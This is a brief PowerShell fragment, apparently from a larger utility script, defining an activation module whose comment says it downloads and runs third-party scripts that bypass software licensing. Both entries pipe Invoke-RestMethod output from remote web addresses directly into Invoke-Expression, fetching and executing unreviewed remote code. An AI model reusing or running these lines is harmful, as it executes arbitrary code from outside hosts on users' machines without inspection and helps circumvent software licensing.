# ==============================================================================
# MODULE: Activation
# ==============================================================================
# NOTE: These modules download and execute third-party activation scripts that
# bypass software licensing. Kept functionally identical to the original script
# as an explicit project decision -- the UI rework does not alter their behaviour.

$Modules["MAS"] = { Invoke-RestMethod https://get.activated.win | Invoke-Expression }
$Modules["IAS"] = { Invoke-RestMethod https://coporton.com/ias | Invoke-Expression }
